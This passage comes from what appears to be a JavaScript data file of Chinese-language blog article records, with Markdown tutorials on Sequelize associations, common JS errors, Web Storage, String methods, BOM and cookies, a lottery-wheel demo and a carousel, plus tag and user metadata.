\n\n一对一关联是由一个单一的外键，实现两个模型之间的精确关联.\n\n```js\n// Comment属于User，即User是主表，Comment是副表\n// 给Comment起别名：from_user，指定Comment表的外键是from_userid,指定User的主键是id\nComment.belongsTo(User, { as: 'from_user', foreignKey: 'from_userid', targetKey: 'id' })\n// 给Comment起别名：to_user，指定Comment表的外键是to_userid,指定User的主键是id\nComment.belongsTo(User, { as: 'to_user', foreignKey: 'to_userid', targetKey: 'id' })\n```\n\n## 一对多：hasMany\n\n一对多关联将一个来源与多个目标连接起来. 而多个目标接到同一个特定的源.\n\n可以设置外键foreignKey，但不能设置目标主键targetKey（设置了也无效），可用sourceKey代替。\n\n```js\n// 一个Show有多个Car,即Show是主表,Car是副表。Car默认外键：ShowTableIds\n// Show.hasMany(Car)\n// 将Car表设置别名xxx\n// Show.hasMany(Car, { as:'xxx' })\n// 一个Show有多个Car,即Show是主表,Car是副表。Car指定外键：idc\n// Show.hasMany(Car, { foreignKey: 'idc' })\n// 一个Show有多个Car,即Show是主表,Car是副表。Car指定外键：idc，Car表主键：color\n// Show.hasMany(Car, { foreignKey: 'idc', sourceKey: 'color' })\n```\n\n ## 多对多：belongsToMany\n\n多对多关联用于将源与多个目标相连接. 此外,目标也可以连接到多个源.\n\n`foreignKey` 将允许你在 **through** 关系中设置 **source model** 键.\n\n`otherKey` 将允许你在 **through** 关系中设置 **target model** 键.\n\n```js\n// 不使用别名的话，默认为article生成articles，使用后：ArticleList\nArticle.belongsToMany(Tag, { as: 'ArticleList' })\n// 不使用别名的话，默认生成tag生成tags，使用后：TagList\nTag.belongsToMany(Article, { as: 'TagList' })\n\n// 将article_id添加到Article_tag，即article_id是外键,不指定Article_tag主键，默认为tagId\n// Article.belongsToMany(Tag, { through: Article_tag, foreignKey: 'article_id' })\n\n// 将tag_id添加到Article_tag，即tag_id是外键,不指定Article_tag主键，默认为ArticleId\n// Tag.belongsToMany(Article, { through: Article_tag, foreignKey: 'tag_id' })\n\n// Article属于多个Tag,即Tag是主表，Article是副表，指定Article_tag是中间表，将article_id添加到Article_tag作为Article的外键,并指定Article_tag主键为tag_id\nArticle.belongsToMany(Tag, { through: Article_tag, foreignKey: 'article_id', otherKey: 'tag_id' })\n// Tag属于多个Article,即Article是主表，Tag是副表，指定Article_tag是中间表，将tag_id添加到Article_tag里面的作为Tag的外键,并指定Article_tag主键为tag_id\nTag.belongsToMany(Article, { through: Article_tag, foreignKey: 'tag_id', otherKey: 'article_id' })\n```\n\n\n\n## 区别\n\n```js\n// Tag是主键表，Article_tag是外键表，Tag带多个Article_tag\nTag.hasMany(Article_tag)\n\n// Article_tag是主键表，Tag是外键表，Article_tag带多个Tag\nTag.belongsTo(Article_tag)\n```\n\n# CURD\n\n## 普通方式\n\n### 创建\n\n- create\n\n```js\nawait Article.create({\n    title, type, img, content, date, click\n})\n```\n\n### 更新\n\n- update\n\n```js\nawait Article.update(\n{\n    title, type, img, content, date, click\n},\n{\n    where: { id:1 }\n})\n```\n\n### 查找\n\n- findOne\n- findAll\n- findAndCountAll\n\n```js\nawait Car.findAndCountAll({\n    where: { id:1 }\n})\n```\n\n### 删除\n\n- destroy\n\n```js\nawait Article.destroy({\n    where: { id:1 }\n})\n```\n\n## 关联\n\n### 创建\n\n方式一：\n\n```js\nawait Article.create(\n    {\n        title: 'Sequelize入门',\n        type: '后端',\n        img: 'null',\n        content: 'Sequelize 是一个基于 promise 的 Node.js ORM',\n        date: '2020-07-03 19:00:00',\n        click: '999',\n        // 这里写Tag模型定义时的名字+复数\n        tags: [\n            { name: 'Sequelize', color: '#2379bd' },\n            { name: 'Orm库', color: '#2f406a' },\n        ]\n    },\n    {\n        include: [\n            {\n                model: Tag,\n            }\n        ]\n    }\n)\n// 上述操作会在article表添加一条{title: 'Sequelize入门'...}记录\n// 同时在tag添加两条记录\n// 同时在article_tag添加两条记录\n```\n\n方式二：\n\n```js\nlet aaa = await Article.create({\n    title: 'Sequelize入门',\n    type: '后端',\n    img: 'null',\n    content: 'Sequelize 是一个基于 promise 的 Node.js ORM',\n    date: '2020-07-03 19:00:00',\n    click: '999'\n})\nlet bbb = await Tag.findAll({ where: { id: [1, 2] } })\nlet ccc = aaa.setTags(bbb)\nres.json({\n    ccc\n})\n\n// 上述操作会在article表添加一条{title: 'Sequelize入门'...}记录\n// 且同时在article_tag添加两条记录\n```\n\n### 更新\n\n```js\nlet update_tags = await Tag.findAll({ where: { id: [1, 2] } })\nlet find_article = await Article.findByPk(355)\nlet update_article = await find_article.update({\n    title: 'Sequelize入门',\n    type: '后端',\n    img: 'null',\n    content: 'Sequelize 是一个基于 promise 的 Node.js ORM',\n    date: '2020-07-03 19:00:00',\n    click: '999',\n})\nlet update_article_result = await find_article.setTags(update_tags)\nres.json(update_article_result)\n\n// 上述操作即修改文章id为355的数据\n// 且同时自动修改article_tag的数据（该删除的删除，该增加的增加）\n```\n\n### 查找\n\n```js\nawait Article_tag.findAndCountAll({\n    include: [\n        {\n            model: Article,\n            include: [\n                {\n                    model: Comment,\n                },\n                {\n                    model: Tag,\n                }\n            ],\n        }\n    ]\n})\n```\n\n### 删除\n\n```js\nlet find_article = await Article.findByPk(id)\nlet delelte_tag = await find_article.setTags([])\nlet delelte_article = await find_article.destroy()\n\n// 上述操作会删除article表中主键为361的数据\n// 且同时自动删除article_tag表中所有和article主键为361有关联的数据\n```\n\n",
      click: 48,
      createdAt: '2020-07-14T09:20:08.000Z',
      updatedAt: '2021-02-16T13:12:11.000Z',
      types: [
        {
          id: 2,
          name: '后端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 32,
            article_id: 32,
            type_id: 2,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 32,
            user_id: 1,
            article_id: 32,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 3,
          name: 'Sequelize',
          color: '#2379bd',
          createdAt: '2020-07-03T12:55:09.000Z',
          updatedAt: '2020-07-03T12:55:09.000Z',
        },
      ],
    },
    {
      id: 31,
      title: '常见报错',
      is_comment: 1,
      status: 1,
      img: '/1594479715854xingyun.jpeg',
      content:
        "# Uncaught SyntaxError\n\n未捕获的语法错误，最低级的错误，直接编译不通过。\n\n通常情况是写错符号，比如for循环应该用分号的写了逗号，函数接受形参应该用逗号但是写了分号。\n\n![err4.png](https://img.cdn.hsslive.cn/1596886137930err4.png)\n\n```js\n// Uncaught SyntaxError: Unexpected token '<'\n// for循环条件之间应该用分号分隔！\nfor (var i = 0, i< 5, i++) {\n    console.log(i);\n}\n```\n```js\nasync function foo() {\n    return 'hello world'\n}\nconsole.log(foo())  //Promise {<fulfilled>: undefined}\n// Uncaught SyntaxError: missing ) after argument list\n// 参数之间应该用逗号分隔！\nfoo().then(v => console.log(v); e => console.log(e))\n```\n\n# Uncaught ReferenceError\n\n未捕获引用错误：Uncaught ReferenceError: xxx is not defined\n\n通常是使用了一个未定义的变量\n\n![err3.png](https://img.cdn.hsslive.cn/1596886168260err3.png)\n\n```js\nconsole.log(a); //Uncaught ReferenceError: a is not defined\na = 10\n```\n\n# Uncaught TypeError\n\n未捕获类型错误：Uncaught TypeError......\n\nshow是一个变量不是一个函数！\n\n![err5.png](https://img.cdn.hsslive.cn/1596886394502err5.png)\n\n```js\nvar show = 10\nshow()      //Uncaught TypeError: show is not a function\n```\n\n# Uncaught (in promise)\n\n未经证实的错误：Uncaught (in promise)\n\n通常是promise抛出（reject）了一个错误，但是没有catch捕获它\n\n![err2.png](https://img.cdn.hsslive.cn/1596886220369err2.png)\n\n```js\nvar ajax = new Promise((resolve, reject) => {\n    console.log('ajax');\n    reject('no')\t//Uncaught (in promise) no\n})\n```\n\n\n# vue单向数据流\n父子组件通信，父组件通过props给子组件传值，子组件可使用传过来的值，虽然props是在子组件定义的，但子组件不能直接修改props里面的值，但是如果props里的数据是array或object类型的可修改其属性或下标值，但仍不可以直接赋值！\n![err1.png](https://img.cdn.hsslive.cn/1594479466709err1.png)\n\n\n# 持续更新中...",
      click: 7,
      createdAt: '2020-07-11T15:01:58.000Z',
      updatedAt: '2020-12-31T14:50:25.000Z',
      types: [
        {
          id: 3,
          name: '随记',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 31,
            article_id: 31,
            type_id: 3,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 31,
            user_id: 1,
            article_id: 31,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [],
    },
    {
      id: 30,
      title: 'Js Storage',
      is_comment: 1,
      status: 1,
      img: '/1590951203454storage.jpg',
      content:
        "# localStorage\n\nlocalStorage 用于长久保存整个网站的数据，保存的数据没有过期时间，直到手动去除。\n\n```js\n<script>\n    localStorage.setItem('name', '张三')\n    localStorage.age = 18\n    localStorage['sex'] = '男'\n    localStorage.obj = JSON.stringify({ name: '小明' })\n    console.log(localStorage.name)  //张三\n    console.log(localStorage.getItem('age'));   //18\n    console.log(localStorage['sex'])        //男\n    console.log(JSON.parse(localStorage.obj))   //{name: \"小明\"}\n    localStorage.removeItem('age')\n    console.log(localStorage.age);  //undefined\n    console.log(localStorage.key(0));   //obj\n    console.log(localStorage.key(1));   //name\n    console.log(localStorage.key(2));   //sex\n    // window.localStorage.clear()\n    // console.log(localStorage);   //Storage {length: 0}\n</script>\n```\n\n\n\n# sessionStorage\n\nsessionStorage 用于临时保存同一窗口(或标签页)的数据，在关闭窗口或标签页之后将会删除这些数据。\n\n方法和localStorage基本相同\n\n",
      click: 3,
      createdAt: '2020-05-31T18:53:37.000Z',
      updatedAt: '2021-02-16T13:11:52.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 30,
            article_id: 30,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 30,
            user_id: 1,
            article_id: 30,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 29,
      title: 'Js String对象',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        '# String对象\n\n## 返回某个指定的字符串值在字符串中首次出现的位置 - indexOf()\n\nindexOf() 来定位字符串中某一个指定的字符首次出现的位置（从0开始），如果没找到对应的字符函数返回-1\n\nPs：组也有此方法，indexOf()搜索数组中的元素，并返回它所在的位置。\n\n```js\nvar str = \'www.baidu.com\'\nconsole.log(str.indexOf(\'w\'));  //0\n```\n\n## 提取字符串的片断 - slice()\n\nslice(start, end) 方法可提取字符串的某个部分，并以新的字符串返回被提取的部分。\n\nPs：数组也有此方法，Array.slice()选取数组的的一部分，并返回一个新数组。\n\n```js\nvar str = \'www.baidu.com\'\nvar str1 = str.slice(1, 4)\nconsole.log(str1);  // ww.\nconsole.log(str2);  // ww.baidu.com\n```\n\n## 字符串分割成数组 - split()\n\n```js\nvar str = \'www.baidu.com\'\nvar arr = str.split(\'.\')\nconsole.log(arr);   //["www", "baidu", "com"]\n```\n\n## 替换 - replace()\n\n```js\nvar str = \'www.baidu.com\'\nvar str3 = str.replace(\'w\', \'p\')\nconsole.log(str3);  //pww.baidu.com\nvar str4 = str.replace(/w/g, \'p\')\nconsole.log(str4);  //ppp.baidu.com\n```\n\n## 匹配 - match()\n\nmatch() 方法将检索字符串 String Object，以找到一个或多个与 regexp 匹配的文本。这个方法的行为在很大程度上有赖于 regexp 是否具有标志 g。如果 regexp 没有标志 g，那么 match() 方法就只能在 stringObject 中执行一次匹配。如果没有找到任何匹配的文本， match() 将返回 **null**。否则，它将返回一个**数组**，其中存放了与它找到的匹配文本有关的信息。\n\n```js\nvar newstr = \'[object Function Text]\'\nvar res = newstr.match(/\\s+\\w+/)\nvar res1 = newstr.match(/\\s+(\\w+)/)\nvar res2 = newstr.match(/\\s+\\w+/g)\nvar res3 = newstr.match(/\\s+(\\w+)/g)\nconsole.log(res);\n// [" Function", index: 7, input: "[object Function Text]", groups: undefined]\nconsole.log(res1);\n// [" Function", "Function", index: 7, input: "[object Function Text]", groups: undefined]\nconsole.log(res2);  //[" Function", " Text"]\nconsole.log(res3);  //[" Function, " Text"]\n```\n\n## 提取字符 - substring()\n\n```js\nvar str = \'www.baidu.com\'\nvar str5 = str.substring(1, 5)\nvar str6 = str.substring(1)\nconsole.log(str5);  //ww.b\nconsole.log(str6);  //ww.baidu.com\n```\n\n## 把字符串转换为小写 - toLowerCase()\n\n## 把字符串转换为大写 - toUpperCase()\n\n## 删除字符串的头尾空格(中间的不行) - trim()',
      click: 4,
      createdAt: '2020-05-31T18:33:08.000Z',
      updatedAt: '2021-02-16T13:11:41.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 29,
            article_id: 29,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 29,
            user_id: 1,
            article_id: 29,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 28,
      title: 'Js BOM',
      is_comment: 1,
      status: 1,
      img: '/1590949183009BOM.png',
      content:
        "# 什么是BOM\n\nBOM，浏览器对象模型（Browser Object Model）。\n\n# Window 对象\n\n所有浏览器都支持 window 对象。它表示浏览器窗口。\n\n所有 JavaScript 全局对象、函数以及变量均自动成为 window 对象的成员。\n\n全局变量是 window 对象的属性。\n\n全局函数是 window 对象的方法。\n\n甚至 HTML DOM 的 document 也是 window 对象的属性之一\n\n# Window Screen\n\n```js\n<script>\n    // 浏览器窗口的内部宽度(包括滚动条)\n    var w = window.innerWidth\n        || document.documentElement.clientWidth\n        || document.body.clientWidth;\n    // 浏览器窗口的内部高度(包括滚动条)\n    var h = window.innerHeight\n        || document.documentElement.clientHeight\n        || document.body.clientHeight;\n\n    console.log(w, h);\n\n    // 浏览器Y轴滚动距离\n    var offsetY = pageYOffset || document.documentElement.scrollTop\n    console.log(offsetY);\n\n    // 浏览器X轴滚动距离\n    var offsetX = pageXOffset || document.documentElement.scrollLeft\n    console.log(offsetX);\n</script>\n```\n\n# Window Location\n\n> location.hostname 返回 web 主机的域名\n>\n> location.pathname 返回当前页面的路径和文件名\n>\n> location.port 返回 web 主机的端口 （80 或 443）\n>\n> location.protocol 返回所使用的 web 协议（http: 或 https:）\n\n## 返回当前页面的URL - location.href\n\n```js\n<script>\n    //file:///E:/BOM/location.html?a=1&b=2\n    console.log(window.location.href);  //file:///E:/BOM/location.html?a=1&b=2\n</script>\n```\n\n## 返回当前页面的URL - location.search\n\n```js\n<script>\n    //file:///E:/BOM/location.html?a=1&b=2\n    console.log(window.location.search);    //?a=1&b=2\n    // 封装获取url参数\n    function getQueryVariable(variable) {\n        var query = window.location.search.substring(1);\n        var vars = query.split(\"&\");\n        for (var i = 0; i < vars.length; i++) {\n            var pair = vars[i].split(\"=\");\n            if (pair[0] == variable) { return pair[1]; }\n        }\n        return false;\n    }\n    console.log(getQueryVariable('a'));\t//1\n    console.log(getQueryVariable('b'));\t//2\n</script>\n```\n\n#  Window History\n\n## history.back()\n\nwindow.history.back()等于点击浏览器的后退按钮，可以加载历史记录的上一个页面\n\n```js\n<script type=\"text/javascript\">\nfunction goBack()\n  {\n  \twindow.history.back()\n  }\n</script>\n```\n\n## history.forward()\n\nwindow.history.forward()等于点击浏览器的前进按钮，可以加载历史记录的下一个页面（前提是有下一个页面）\n\n```js\n<script type=\"text/javascript\">\nfunction goBack()\n  {\n  \twindow.history.forward()\n  }\n</script>\n```\n\n## history.go()\n\n> window.history.go(1)加载历史列表中的下一个页面，约等于window.history.forward()\n>\n> window.history.go(-1)加载历史列表中的前一个页面，约等于window.history.back()\n>\n> window.history.go()如果不指定参数，默认参数为0，相当于刷新当前页面\n\n```js\n<script type=\"text/javascript\">\nfunction goBack()\n  {\n  \twindow.history.go(-1)\n  }\n</script>\n```\n\n# cookie\n\ncookie要在服务器设置（如：http://localhost/cookie.html），直接一个html文件（如：E:/cookie.html）设置不了。\n\nexpires：过期时间，默认为浏览器关闭时删除\n\n## 设置cookie\n\n> document.cookie=\"user=admin\"\n>\n> 删除cookie只需要设置过期时间为过去的时间即可\n\n```js\n<script>\n    //封装设置cookie函数\n    function setCookie(cname, cvalue, exdays) {\n        var d = new Date();\n        d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));\n        var expires = \"expires=\" + d.toUTCString();\n        document.cookie = cname + \"=\" + cvalue + \"; \" + expires;\n    }\n    setCookie('user', 'admin', 1)\n    setCookie('pwd', 123456, 1)\n\tsetCookie('pwd', 123456, -1)\t//移除pwd的cookie\n\tconsole.log(document.cookie);\t//user=admin; pwd=123456\n</script>\n```\n\n## 获取cookie\n\n> document.cookie\n>\n> 获取的cookie格式：\"user=admin; pwd=123456\"\n\n```js\n<script>\n    //封装设置cookie函数\n    function setCookie(cname, cvalue, exdays) {\n        var d = new Date();\n        d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));\n        var expires = \"expires=\" + d.toUTCString();\n        document.cookie = cname + \"=\" + cvalue + \"; \" + expires;\n    }\n    //封装获取cookie函数\n    function getCookie(cname) {\n        var name = cname + \"=\";\n        var ca = document.cookie.split(';');\n        for (var i = 0; i < ca.length; i++) {\n            var c = ca[i].trim();\n            if (c.indexOf(name) == 0) { return c.substring(name.length); }\n        }\n        return \"\";\n    }\n    setCookie('user', 'admin', 1)\n    setCookie('pwd', 123456, 1)\n\tconsole.log(document.cookie);\t//user=admin; pwd=123456\n    console.log(getCookie('user')); //admin\n    console.log(getCookie('pwd'));  //123456\n</script>\n```\n\n# 常用方法\n\n## onload()\n\nonload 事件会在页面加载完成后立即发生。一个页面只会执行一个onload事件，后面的会覆盖前面的\n\n**注意：由于html文档是自上而下执行的，而onload是文档加载完成才执行的，因此html文档里的onclick事件里执行的函数不能在onload里定义，否则会报undefined**\n\n```html\n<script>\n    window.onload = function () {\n        console.log('onload在页面加载完成执行');\n        console.log(document.getElementById('test'));\n    }\n    console.log(document.getElementById('test'));  //null \n</script>\n\n<body>\n    <div id=\"test\"></div>\n</body>\n```\n\n## alert()\n\n警告框\n\n## confirm()\n\n确认框\n\n点击确定返回：true\n\n点击取消返回：false\n\n```html\n<script>\n    function show() {\n        var res = window.confirm('确定or取消？')\n        console.log(res);\n    }\n</script>\n\n<body>\n    <button onclick=\"show()\">弹出确认</button>\n</body>\n```\n\n## prompt()\n\n提示框\n\n```js\nfunction show() {\n    var mes = prompt('提示标题', '提示内容')\n    console.log(mes);\t//输出提示框的内容\n}\n```\n\n\n\n## setTimeout()\n\n在指定的毫秒数后执行指定代码。\n\n```js\n<script>\n    setTimeout(() => {\n        console.log('一秒后执行');\n    }, 1000);\n</script>\n```\n\n## clearTimeout()\n\n停止执行setTimeout()\n\n```js\n<script>\n    var timer = setTimeout(() => {\n        console.log('一秒后执行');\n    }, 1000);\n    clearTimeout(timer)\n</script>\n```\n\n ## setInterval()\n\n间隔指定的毫秒数不停地执行指定的代码。\n\n```js\n<script>\n    setInterval(() => {\n        console.log('每一秒执行一次');\n    }, 1000);\n</script>\n```\n\n## clearInterval()\n\n停止执行setInterval()\n\n```js\n<script>\n    var i = 0\n    var timer1 = setInterval(() => {\n        i++;\n        console.log('每一秒执行一次');\n        if (i > 5) {\n            clearInterval(timer1)\n            console.log('停止了timer1');\n        }\n    }, 1000);\n</script>\n```\n\n",
      click: 8,
      createdAt: '2020-05-31T18:19:56.000Z',
      updatedAt: '2021-02-16T13:11:33.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 28,
            article_id: 28,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 28,
            user_id: 1,
            article_id: 28,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 27,
      title: 'Js 简单的转盘抽奖',
      is_comment: 1,
      status: 1,
      img: '/1590940837517zhuanpan.png',
      content:
        '```html\n<style>\n    .wrap {\n        position: relative;\n        /* display: flex;\n        justify-content: center;\n        align-items: center; */\n        width: 450px;\n        height: 450px;\n        background-color: pink;\n    }\n\n    #start {\n        position: absolute;\n        top: 50%;\n        left: 50%;\n        margin-top: -138px;\n        margin-left: -94px;\n        z-index: 100;\n    }\n\n    #start:hover {\n        cursor: pointer;\n    }\n\n    #bgc {\n        z-index: 10;\n        width: 450px;\n        height: 450px;\n        color: red\n    }\n</style>\n\n<body>\n    <div class="wrap">\n        <div id="start">\n            <img src="1.png" alt="">\n        </div>\n        <div id="bgc" style="transform: rotate(25deg);">\n            <img src="2.png" alt="">\n        </div>\n    </div>\n    <script>\n        var start = document.getElementById(\'start\')\n        var bgc = document.getElementById(\'bgc\')\n        // 节流函数，让规定时间内只执行一次函数\n        function throttle(fn, delay) {\n            let bool = true\n            return function () {\n                if (bool == true) {\n                    bool = false\n                    fn()\n                    setTimeout(() => {\n                        // fn()\n                        bool = true\n                    }, delay);\n                }\n            }\n        }\n        function gostart() {\n            //间隔度数\n            var deg = Math.floor(360 / 7)\n            //0-6随机数(从0开始算)\n            var ran = Math.floor(Math.random() * 7)\n            console.log(ran);\n            //转多少度数\n            var res = ran * deg\n            console.log(res);\n            //让转盘至少转10圈，加25度是为了让指针指向选中块的中间\n            var res1 = res + (360 * 10) + 25\n            console.log(res1);\n            bgc.style.transform = "rotate(" + res1 + "deg)";\n            bgc.style.transition = "ease-out 1s";\n            switch (ran) {\n                case 0:\n                    console.log(\'免单4999元\');\n                    setTimeout(() => {\n                        alert(\'免单4999元\')\n                        bgc.style = ""\n                        bgc.style.transform = "rotate(" + 25 + "deg)"\n                    }, 1000);\n\n                    break;\n                case 1:\n                    console.log(\'免单50元\');\n                    setTimeout(() => {\n                        alert(\'免单50元\')\n                        bgc.style = ""\n                        bgc.style.transform = "rotate(" + 25 + "deg)"\n                    }, 1000);\n\n                    break;\n                case 2:\n                    console.log(\'免单10元\');\n                    setTimeout(() => {\n                        alert(\'免单10元\')\n                        bgc.style = ""\n                        bgc.style.transform = "rotate(" + 25 + "deg)"\n                    }, 1000);\n\n                    break;\n                case 3:\n                    console.log(\'免单5元\');\n                    setTimeout(() => {\n                        alert(\'免单5元\')\n                        bgc.style = ""\n                        bgc.style.transform = "rotate(" + 25 + "deg)"\n                    }, 1000);\n\n                    break;\n                case 4:\n                    console.log(\'免分期服务费\');\n                    setTimeout(() => {\n                        alert(\'免分期服务费\')\n                        bgc.style = ""\n                        bgc.style.transform = "rotate(" + 25 + "deg)"\n                    }, 1000);\n\n                    break;\n                case 5:\n                    console.log(\'提高白条额度\');\n                    setTimeout(() => {\n                        alert(\'提高白条额度\')\n                        bgc.style = ""\n                        bgc.style.transform = "rotate(" + 25 + "deg)"\n                    }, 1000);\n\n                    break;\n                case 6:\n                    console.log(\'未中奖\');\n                    setTimeout(() => {\n                        alert(\'未中奖\')\n                        bgc.style = ""\n                        bgc.style.transform = "rotate(" + 25 + "deg)"\n                    }, 1000);\n\n                    break;\n            }\n\n        }\n        start.addEventListener(\'click\', throttle(gostart, 1000))\n    </script>\n</body>\n\n```\n',
      click: 96,
      createdAt: '2020-05-31T16:00:51.000Z',
      updatedAt: '2021-02-16T13:11:10.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 27,
            article_id: 27,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 27,
            user_id: 1,
            article_id: 27,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 26,
      title: 'js无缝轮播图',
      is_comment: 1,
      status: 1,
      img: '/1598023132776lbt.png',
      content:
        "## 前言\n\n轮播图，基本是前端程序员在学习js的时候，都会拿来练手的组件，因此我特意花时间用原生js实现了一下无缝轮播图，此外还有用vue封装的pc端无缝轮播图和移动端无缝轮播图！\n\n## html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n    <link rel=\"stylesheet\" href=\"./main.css\">\n</head>\n\n<body>\n    <div class=\"container\">\n        <h2>Carousel</h2>\n        <div class=\"carousel\">\n            <div class=\"panels\">\n                <div class=\"active panels-item\">1</div>\n                <div class=\"panels-item\">2</div>\n                <div class=\"panels-item\">3</div>\n                <div class=\"panels-item\">4</div>\n            </div>\n            <div class=\"arrow\">\n                <i class=\"left-arrow\"></i>\n                <i class=\"right-arrow\"></i>\n            </div>\n            <ul class=\"poins\">\n                <li class=\"active\"><button></button></li>\n                <li><button></button></li>\n                <li><button></button></li>\n                <li><button></button></li>\n            </ul>\n        </div>\n    </div>\n    <script>\n\n        // js修改style样式：dom.style.color='red',不能直接dom.style='color:red'\n        // 通过Object.assign()，将新的style复制到原本的dom元素\n        const css = ($node, newStyle) => Object.assign($node.style, newStyle)\n        const animation = {\n            // 垂直轮播\n            vertical($from, $to, direction) {\n                // 首先清空原本的style样式，然后再自定义样式，因为如果不先清空style，\n                // 会导致第二轮轮播的时候，之前设置的setTimeout的样式先执行css()，这时候就会出问题，\n                // 所以应该在每次轮播时，先清空之前的style，再重新设置css()和setTimeout\n                $from.style = ''\n                $to.style = ''\n                css($from, {\n                    transform: `translateY(0)`,\n                    zIndex: 10\n                })\n                css($to, {\n                    transform: `translateY(${direction === 'pre' ? '-' : ''}100%)`,\n                    zIndex: 10\n                })\n                setTimeout(() => css($from, {\n                    transform: `translateY(${direction === 'next' ? '-' : ''}100%)`,\n                    transition: `.4s`,\n                }), 0)\n                setTimeout(() => css($to, {\n                    transform: `translateY(0)`,\n                    transition: `.4s`,\n                }), 0)\n            },\n            // 水平轮播\n            horizontal($from, $to, direction) {\n                $from.style = ''\n                $to.style = ''\n                css($from, {\n                    transform: `translateX(0)`,\n                    zIndex: 10\n                })\n                css($to, {\n                    transform: `translateX(${direction === 'pre' ? '-' : ''}100%)`,\n                    zIndex: 10\n                })\n                setTimeout(() => css($from, {\n                    transform: `translateX(${direction === 'next' ? '-' : ''}100%)`,\n                    transition: `.4s`,\n                }), 0)\n                setTimeout(() => css($to, {\n                  